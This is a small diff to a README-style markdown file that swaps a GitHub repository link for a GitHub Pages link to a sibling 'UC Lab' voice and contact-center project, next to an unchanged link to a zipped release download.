@@ -33,6 +33,6 @@ Free to use, share and remix. See [START-HERE.md](./START-HERE.md) for how to st
 
 ## Sibling
 
-UC Lab (voice and contact center): https://github.com/cipher0x9/uc-lab-free-university-mesmerizing
+UC Lab (voice and contact center): https://cipher0x9.github.io/uc-lab-free-university-mesmerizing/
 
 Campus zip: https://github.com/cipher0x9/uc-lab-free-university-mesmerizing/releases/download/v20.2-resources/v17-UNIVERSITY.html.zip
